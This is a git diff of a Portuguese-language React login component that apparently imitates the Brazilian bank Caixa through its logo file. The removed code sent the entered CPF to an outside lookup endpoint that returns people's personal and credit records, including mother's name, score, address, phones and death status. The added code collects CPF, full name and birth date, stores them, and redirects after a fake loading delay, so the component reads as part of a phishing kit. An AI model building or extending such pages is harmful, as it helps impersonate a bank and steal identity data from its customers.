@@ -1,47 +1,12 @@
 import { useState } from "react";
 import logo from "../assets/caixa.webp";
 import userIcon from "../assets/user.png";
-import axios from "axios";
-
-// Configuração da API
-const api = axios.create({
-    baseURL: 'https://x-search.xyz/test-by-x-slayer/apis/rafa/01',
-    headers: {
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
-    },
-});
-
-// Tipagem da resposta simulada
-interface UserData {
-    CPF: string;
-    Nome: string;
-    Nome_Mae: string;
-    Sexo: string;
-    Data_Nascimento: string;
-    Estado_Civil: string;
-    Escolaridade: string;
-    Profissao: string;
-    Renda: string;
-    Score: string;
-    Faixa_Risco: string;
-    Endereco: string;
-    Numero: string;
-    Bairro: string;
-    Cidade: string;
-    Estado: string;
-    Telefones: string;
-    Emails: string;
-    Obito: string;
-}
 
 export function Login() {
     const [cpf, setCpf] = useState<string>("");
+    const [nomeCompleto, setNomeCompleto] = useState<string>("");
+    const [dataNascimento, setDataNascimento] = useState<string>("");
     const [isLoading, setIsLoading] = useState<boolean>(false);
-    const [userData, setUserData] = useState<UserData | null>(null); // Estado para dados do usuário
-
-
-    console.log(userData)
 
     // Função para aplicar a máscara de CPF
     const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
@@ -55,35 +20,35 @@ export function Login() {
         setCpf(value);
     };
 
-    // Função que chama a API e armazena os dados no localStorage
-    const fetchUserData = async () => {
-        try {
-            setIsLoading(true); // Ativa o estado de carregamento
-
-            const response = await api.get<{ status: number; dados: UserData[] }>(`/cpf.php?cpf=${cpf.replace(/\D/g, '')}`);
-            const user = response.data.dados[0];
-
-            // Armazena os dados no estado e no localStorage
-            setUserData(user);
-            localStorage.setItem(cpf, JSON.stringify(user));
-
-            // Redireciona após o sucesso
-            window.location.href = "/carregando";
-
-        } catch (error) {
-            console.error("Erro ao buscar dados do usuário:", error);
-        } finally {
-            setIsLoading(false); // Desativa o estado de carregamento
-        }
-    };
-
-    // Função chamada ao clicar no botão "Próximo"
+    // Função para salvar os dados no localStorage e redirecionar com animação
     const handleNext = () => {
-        if (cpf.length < 14) {
-            alert("Por favor, insira um CPF válido.");
+        if (cpf.length < 14 || nomeCompleto.length === 0 || dataNascimento.length === 0) {
+            alert("Por favor, preencha todos os campos corretamente.");
             return;
         }
-        fetchUserData(); // Chama a API ao clicar no botão
+
+        setIsLoading(true);
+
+        // Cria o objeto userData
+        const userData = {
+            nome: nomeCompleto,
+            cpf: cpf,
+            dataNascimento: dataNascimento,
+            email: "",
+            cep: "",
+            cidade: "",
+            estado: "",
+            rua: "",
+            numero: ""
+        };
+
+        // Armazena o objeto userData no localStorage
+        localStorage.setItem("userData", JSON.stringify(userData));
+
+        setTimeout(() => {
+            setIsLoading(false);
+            window.location.href = "/carregando";
+        }, 1500); // Animação de 1.5 segundos antes do redirecionamento
     };
 
     return (
@@ -95,10 +60,11 @@ export function Login() {
 
             <div>
                 <h1 className="text-lg text-zinc-500">
-                    Informe seu CPF e clique em "Próximo" para continuar:
+                    Informe seus dados e clique em "Próximo" para continuar:
                 </h1>
             </div>
 
+            {/* Campo CPF */}
             <div className="flex items-center space-x-2">
                 <img src={userIcon} alt="user" width={15} />
                 <input
@@ -111,10 +77,33 @@ export function Login() {
                 />
             </div>
 
+            {/* Campo Nome Completo */}
+            <div className="flex items-center space-x-2 mt-4">
+                <img src={userIcon} alt="user" width={15} />
+                <input
+                    type="text"
+                    value={nomeCompleto}
+                    onChange={(e) => setNomeCompleto(e.target.value)}
+                    className="border-b border-b-orange-500 w-full text-lg outline-none"
+                    placeholder="Nome Completo"
+                />
+            </div>
+
+            {/* Campo Data de Nascimento */}
+            <div className="flex items-center space-x-2 mt-4">
+                <img src={userIcon} alt="user" width={15} />
+                <input
+                    type="date"
+                    value={dataNascimento}
+                    onChange={(e) => setDataNascimento(e.target.value)}
+                    className="border-b border-b-orange-500 w-full text-lg outline-none"
+                />
+            </div>
+
+            {/* Botão Próximo */}
             <button
                 onClick={handleNext}
-                className={`w-full text-white rounded-sm flex items-center justify-center h-10 ${isLoading ? "bg-orange-500 cursor-not-allowed" : "bg-orange-400"
-                    }`}
+                className={`w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 ${isLoading ? "bg-orange-500 cursor-not-allowed transform scale-90" : "bg-orange-400 hover:scale-105"}`}
                 disabled={isLoading}
             >
                 {isLoading ? (
